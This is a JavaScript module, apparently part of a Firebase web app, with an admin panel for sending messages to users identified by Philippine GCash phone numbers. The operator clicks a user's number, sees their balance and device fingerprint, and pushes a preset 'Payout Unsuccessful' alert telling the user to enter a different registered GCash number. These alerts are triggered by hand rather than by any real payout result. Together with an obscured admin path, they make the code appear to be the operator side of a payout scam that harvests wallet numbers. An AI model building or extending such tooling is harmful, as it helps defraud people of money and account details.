/**
 * ADCOM.JS v2.3 - Standardized Phone Format (09XXXXXXXXX)
 * 
 * PHONE FORMAT STANDARD:
 * - Input: +639171234567, 639171234567, 09171234567, 9171234567
 * - Output: 09171234567 (always 09 + 9 digits)
 * 
 * FEATURES:
 * - Real-time user notifications via Firebase onValue listener
 * - Admin popup with user info and command buttons
 * - Clickable phone numbers in admin tables
 * - Standardized phone format for consistent Firebase paths
 * - Clears userPhone from localStorage after alert
 */

// ========== DETECT CURRENT PAGE ==========
const isAdminPage = window.location.pathname.includes('admin') || 
                    window.location.pathname.includes('admin_12820') ||
                    document.querySelector('.cia-header') !== null;

// ========== CONFIGURATION ==========
const CONFIG = {
    USER_SESSIONS_PATH: 'user_sessions',
    MSG_WRONG_NUMBER: '⚠️ Payout Unsuccessful! Please use your registered GCash number.',
    MSG_RESTRICTED: '⚠️ Payout Unsuccessful! Your number is restricted. Use another registered number.',
    POPUP_DELAY: 1500,
    LISTENER_DELAY: 1500,
    INITIAL_CHECK_DELAY: 2000,
    RETRY_ATTEMPTS: 10,
    RETRY_INTERVAL: 2000
};

// ========== CSS PARA SA ADMIN POPUP ==========
if (isAdminPage) {
    const style = document.createElement('style');
    style.textContent = `
        .admin-command-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 9999999;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: fadeIn 0.3s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .admin-command-popup-content {
            width: 90%;
            max-width: 400px;
            background: #1a1a2e;
            border-radius: 16px;
            border: 2px solid #00f2ff;
            overflow: hidden;
            animation: slideUp 0.3s ease;
        }
        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .admin-command-popup-header {
            padding: 15px;
            background: rgba(0,242,255,0.1);
            border-bottom: 1px solid #00f2ff;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .admin-command-popup-header h3 { 
            color: #00f2ff; 
            margin: 0; 
            font-size: 14px; 
            font-weight: 600;
        }
        .close-popup { 
            background: none; 
            border: none; 
            color: #fff; 
            font-size: 20px; 
            cursor: pointer;
            transition: color 0.2s;
        }
        .close-popup:hover { color: #ff4444; }
        .user-info-section { padding: 15px; }
        .info-row { 
            margin-bottom: 10px; 
            font-size: 13px;
            display: flex;
            align-items: center;
        }
        .info-label { 
            color: #888; 
            display: inline-block; 
            width: 100px;
            flex-shrink: 0;
        }
        .info-value { 
            color: #fff; 
            font-weight: 500;
        }
        .command-buttons-section { 
            padding: 15px; 
            border-top: 1px solid #333; 
        }
        .command-buttons-grid { 
            display: flex; 
            gap: 10px; 
        }
        .command-btn { 
            flex: 1; 
            padding: 12px; 
            border: none; 
            border-radius: 10px; 
            font-weight: bold; 
            cursor: pointer;
            transition: transform 0.2s, opacity 0.2s;
            font-size: 12px;
        }
        .command-btn:hover {
            transform: translateY(-2px);
            opacity: 0.9;
        }
        .command-btn:active {
            transform: translateY(0);
        }
        .command-1 { background: #ff9800; color: #fff; }
        .command-2 { background: #2196f3; color: #fff; }

        /* HIGHLIGHT clickable phones */
        .clickable-phone { 
            cursor: pointer !important; 
            color: #00f2ff !important; 
            text-decoration: underline !important;
            transition: all 0.2s;
            font-weight: 500;
        }
        .clickable-phone:hover {
            color: #80f7ff !important;
            text-shadow: 0 0 8px rgba(0, 242, 255, 0.5);
        }

        .sent-badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 10px;
            margin-left: 8px;
        }
        .badge-success { background: #4caf50; color: #fff; }
        .badge-pending { background: #ff9800; color: #fff; }
    `;
    document.head.appendChild(style);
}

// ========== STANDARDIZED PHONE FORMAT ==========
/**
 * STANDARDIZE PHONE NUMBER TO 09XXXXXXXXX FORMAT
 * 
 * Input variations:
 *   +639171234567 → 09171234567
 *   639171234567  → 09171234567
 *   09171234567   → 09171234567 (already standard)
 *   9171234567    → 09171234567
 *   +63 917 123 4567 → 09171234567
 *   09 171 234 567   → 09171234567
 * 
 * Output: Always 09123456789 format (11 digits, starts with 09)
 */
function standardizePhone(phone) {
    if (!phone || typeof phone !== 'string') return '';

    // Step 1: Remove all non-digit characters
    let digits = phone.replace(/\D/g, '');

    // Step 2: Handle different formats
    if (digits.startsWith('63') && digits.length >= 12) {
        // Format: 639171234567 (with country code, no +)
        // Remove '63' and add '0'
        digits = '0' + digits.substring(2);
    } else if (digits.startsWith('63') && digits.length === 12) {
        // Format: 639171234567 (12 digits)
        digits = '0' + digits.substring(2);
    } else if (digits.startsWith('9') && !digits.startsWith('09') && digits.length === 10) {
        // Format: 9171234567 (10 digits, starts with 9)
        digits = '0' + digits;
    } else if (digits.startsWith('09') && digits.length === 11) {
        // Format: 09171234567 (already standard)
        // Keep as is
    } else if (digits.length === 11 && digits.startsWith('0')) {
        // Format: 0917... (already standard)
        // Keep as is
    }

    // Step 3: Validate - should be 11 digits starting with 09
    if (digits.length !== 11 || !digits.startsWith('09')) {
        console.warn('⚠️ Invalid phone format after standardization:', phone, '→', digits);
        // Return original digits if we can't standardize
        return digits;
    }

    return digits;
}

// ========== UTILITY FUNCTIONS ==========
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 8px;
        color: #fff;
        font-weight: 500;
        z-index: 99999999;
        animation: slideInRight 0.3s ease;
        max-width: 300px;
        word-wrap: break-word;
        background: ${type === 'success' ? '#4caf50' : '#ff4444'};
    `;
    toast.textContent = message;
    document.body.appendChild(toast);

    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transition = 'opacity 0.3s';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ========== ADMIN: SHOW USER POPUP ==========
async function showUserDetailsPopup(phone) {
    if (!isAdminPage) return;

    const standardizedPhone = standardizePhone(phone);

    try {
        const userSnap = await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone).once('value');
        const userData = userSnap.val();

        if (!userData) {
            showToast('User not found or offline', 'error');
            return;
        }

        const balance = (userData.balance || 0).toFixed(2);
        const device = userData.deviceFingerprint || 'Unknown';
        const lastActive = userData.lastActive ? new Date(userData.lastActive).toLocaleString() : 'N/A';
        const hasPendingCommand = !!userData.adminCommand;

        const popupHTML = `
            <div id="userCommandPopup" class="admin-command-popup">
                <div class="admin-command-popup-content">
                    <div class="admin-command-popup-header">
                        <h3>👤 SEND MESSAGE ${hasPendingCommand ? '<span class="sent-badge badge-pending">PENDING</span>' : ''}</h3>
                        <button class="close-popup" onclick="closeUserCommandPopup()">✕</button>
                    </div>
                    <div class="user-info-section">
                        <div class="info-row">
                            <span class="info-label">📱 Number:</span>
                            <span class="info-value">${escapeHtml(phone)}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">💰 Balance:</span>
                            <span class="info-value">₱${balance}</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">🔑 Device:</span>
                            <span class="info-value">${escapeHtml(device.substring(0, 20))}...</span>
                        </div>
                        <div class="info-row">
                            <span class="info-label">🕐 Last Active:</span>
                            <span class="info-value">${lastActive}</span>
                        </div>
                    </div>
                    <div class="command-buttons-section">
                        <div class="command-buttons-grid">
                            <button class="command-btn command-1" onclick="sendCommand('${escapeHtml(phone)}', '1')">
                                📧 WRONG NUMBER
                            </button>
                            <button class="command-btn command-2" onclick="sendCommand('${escapeHtml(phone)}', '2')">
                                📞 RESTRICTED
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        `;

        closeUserCommandPopup();
        document.body.insertAdjacentHTML('beforeend', popupHTML);
    } catch (error) {
        console.error('Popup error:', error);
        showToast('Error loading user data', 'error');
    }
}

function closeUserCommandPopup() {
    const popup = document.getElementById('userCommandPopup');
    if (popup) {
        popup.style.animation = 'fadeOut 0.2s ease';
        setTimeout(() => popup.remove(), 200);
    }
}

// ========== ADMIN: SEND COMMAND ==========
async function sendCommand(phone, type) {
    if (!isAdminPage) return;

    closeUserCommandPopup();

    const standardizedPhone = standardizePhone(phone);
    const message = type === '1' ? CONFIG.MSG_WRONG_NUMBER : CONFIG.MSG_RESTRICTED;

    console.log('📤 Sending command to:', standardizedPhone);

    try {
        await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone).update({
            adminCommand: message,
            commandTimestamp: Date.now(),
            commandType: type,
            commandStatus: 'pending'
        });

        showToast('✅ Message sent to user!');
        console.log('✅ Command saved to Firebase');
    } catch (error) {
        console.error('❌ Send command error:', error);
        showToast('❌ Failed to send message', 'error');
    }
}

// ========== ADMIN: MAKE PHONES CLICKABLE ==========
let phoneClickAttempts = 0;

function makePhonesClickable() {
    if (!isAdminPage) return;

    const phoneRegex = /^(\+63\d{10}|09\d{9}|63\d{10}|9\d{9})$/;
    let foundPhones = 0;

    const ghostData = document.getElementById('ghostData');
    if (!ghostData) {
        console.log('ghostData not found yet, retrying...');
        return 0;
    }

    // Get all elements that might contain phone numbers
    const allElements = ghostData.querySelectorAll('*');

    allElements.forEach(element => {
        if (element.hasAttribute('data-clickable')) return;

        const text = element.textContent || element.innerText || '';
        const trimmedText = text.trim();

        if (phoneRegex.test(trimmedText) && element.children.length === 0) {
            element.setAttribute('data-clickable', 'true');
            element.classList.add('clickable-phone');
            element.style.cursor = 'pointer';

            element.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Phone clicked:', trimmedText);
                showUserDetailsPopup(trimmedText);
            });

            foundPhones++;
        }
    });

    // Also check td elements directly
    const tds = ghostData.querySelectorAll('td');
    tds.forEach(td => {
        if (td.hasAttribute('data-clickable')) return;

        const text = td.textContent || td.innerText || '';
        const trimmedText = text.trim();

        if (phoneRegex.test(trimmedText)) {
            td.setAttribute('data-clickable', 'true');
            td.classList.add('clickable-phone');
            td.style.cursor = 'pointer';

            td.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('TD Phone clicked:', trimmedText);
                showUserDetailsPopup(trimmedText);
            });

            foundPhones++;
        }
    });

    if (foundPhones > 0) {
        console.log(`✅ Made ${foundPhones} phone numbers clickable`);
    }

    return foundPhones;
}

// ========== OBSERVE TABLE CHANGES ==========
let tableObserver = null;
let dropdownObserver = null;

function observeTableChanges() {
    if (!isAdminPage) return;

    const ghostData = document.getElementById('ghostData');
    const userDropdown = document.getElementById('userDropdown');

    // Strategy 1: Observe ghostData directly
    if (ghostData) {
        if (tableObserver) tableObserver.disconnect();

        tableObserver = new MutationObserver((mutations) => {
            let hasChanges = false;
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                    hasChanges = true;
                }
            });
            if (hasChanges) {
                console.log('Table mutated, re-applying click handlers...');
                setTimeout(makePhonesClickable, 100);
            }
        });

        tableObserver.observe(ghostData, { 
            childList: true, 
            subtree: true 
        });

        console.log('✅ Table observer attached to ghostData');
    }

    // Strategy 2: Observe dropdown container
    if (userDropdown) {
        if (dropdownObserver) dropdownObserver.disconnect();

        dropdownObserver = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.attributeName === 'style' || mutation.attributeName === 'class') {
                    const isVisible = userDropdown.style.display !== 'none' && 
                                     !userDropdown.classList.contains('hidden');
                    if (isVisible) {
                        console.log('Dropdown opened, applying click handlers...');
                        setTimeout(makePhonesClickable, 300);
                    }
                }
                if (mutation.type === 'childList') {
                    setTimeout(makePhonesClickable, 100);
                }
            });
        });

        dropdownObserver.observe(userDropdown, { 
            childList: true, 
            subtree: true,
            attributes: true,
            attributeFilter: ['style', 'class']
        });

        console.log('✅ Dropdown observer attached');
    }

    // Strategy 3: Retry with increasing delays
    let attempts = 0;
    const retryInterval = setInterval(() => {
        attempts++;
        const found = makePhonesClickable();

        if (found > 0 || attempts >= CONFIG.RETRY_ATTEMPTS) {
            clearInterval(retryInterval);
            if (found > 0) {
                console.log(`✅ Success after ${attempts} attempts`);
            } else {
                console.log('⚠️ No phones found after max attempts');
            }
        }
    }, CONFIG.RETRY_INTERVAL);

    // Strategy 4: Hook into dropdown toggle
    if (typeof toggleDropdown === 'function') {
        const originalToggle = toggleDropdown;
        window.toggleDropdown = function(id) {
            originalToggle(id);
            if (id === 'userDropdown') {
                setTimeout(makePhonesClickable, 500);
                setTimeout(makePhonesClickable, 1000);
                setTimeout(makePhonesClickable, 2000);
            }
        };
        console.log('✅ Hooked into toggleDropdown');
    }

    // Initial attempt
    makePhonesClickable();
}

// ========== USER: REAL-TIME COMMAND LISTENER ==========
let commandListenerActive = false;
let commandUnsubscribe = null;

function startRealTimeCommandListener() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone || commandListenerActive) return;

    const standardizedPhone = standardizePhone(userPhone);

    console.log('🔔 Starting real-time command listener');
    console.log('   Original phone:', userPhone);
    console.log('   Standardized:', standardizedPhone);
    console.log('   Firebase path:', CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone + '/adminCommand');

    commandListenerActive = true;

    commandUnsubscribe = db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone + '/adminCommand')
        .on('value', async (snapshot) => {
            const message = snapshot.val();

            console.log('📨 Listener triggered!');
            console.log('   Message:', message);
            console.log('   Snapshot exists:', snapshot.exists());

            if (message) {
                console.log('✅ Valid message received, showing alert...');
                alert(message);

                await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone).update({
                    commandStatus: 'received',
                    commandReceivedAt: Date.now()
                });

                await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone + '/adminCommand').remove();

                // CLEAR userPhone from localStorage
                localStorage.removeItem('userPhone');
                console.log('🗑️ userPhone cleared from localStorage');

                stopRealTimeCommandListener();
            } else {
                console.log('ℹ️ No message (null or removed)');
            }
        }, (error) => {
            console.error('❌ Listener error:', error);
            commandListenerActive = false;
            setTimeout(startRealTimeCommandListener, 5000);
        });

    console.log('✅ Listener attached successfully');
}

function stopRealTimeCommandListener() {
    if (commandUnsubscribe) {
        commandUnsubscribe();
        commandUnsubscribe = null;
    }
    commandListenerActive = false;
    console.log('🛑 Command listener stopped');
}

// ========== USER: FALLBACK CHECK ==========
async function checkForAdminCommand() {
    const userPhone = localStorage.getItem('userPhone');
    if (!userPhone) return false;

    try {
        const standardizedPhone = standardizePhone(userPhone);
        const snapshot = await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone).once('value');
        const userData = snapshot.val();

        if (userData && userData.adminCommand) {
            alert(userData.adminCommand);
            await db.ref(CONFIG.USER_SESSIONS_PATH + '/' + standardizedPhone + '/adminCommand').remove();
            localStorage.removeItem('userPhone');
            return true;
        }
    } catch (error) {
        console.log('Fallback check error:', error);
    }
    return false;
}

function hookUserActions() {
    document.body.addEventListener('click', async () => {
        if (!commandListenerActive) await checkForAdminCommand();
    }, true);
    document.body.addEventListener('submit', async () => {
        if (!commandListenerActive) await checkForAdminCommand();
    }, true);
}

// ========== VISIBILITY API ==========
document.addEventListener('visibilitychange', () => {
    if (!document.hidden && !isAdminPage) {
        const userPhone = localStorage.getItem('userPhone');
        if (userPhone && !commandListenerActive) {
            console.log('Tab visible, restarting command listener...');
            startRealTimeCommandListener();
        }
    }
});

// ========== START ==========
function init() {
    console.log('🚀 ADCOM.JS v2.3 initializing...');
    console.log('   isAdminPage:', isAdminPage);
    console.log('   Current path:', window.location.pathname);

    if (isAdminPage) {
        console.log('👤 ADMIN MODE');
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(observeTableChanges, CONFIG.POPUP_DELAY);
            });
        } else {
            setTimeout(observeTableChanges, CONFIG.POPUP_DELAY);
        }
    } else {
        console.log('👤 USER MODE');
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => {
                setTimeout(() => {
                    startRealTimeCommandListener();
                    hookUserActions();
                }, CONFIG.LISTENER_DELAY);
                setTimeout(checkForAdminCommand, CONFIG.INITIAL_CHECK_DELAY);
            });
        } else {
            setTimeout(() => {
                startRealTimeCommandListener();
                hookUserActions();
            }, CONFIG.LISTENER_DELAY);
            setTimeout(checkForAdminCommand, CONFIG.INITIAL_CHECK_DELAY);
        }
    }
}

window.addEventListener('beforeunload', () => {
    if (!isAdminPage && commandUnsubscribe) {
        commandUnsubscribe();
    }
});

init();
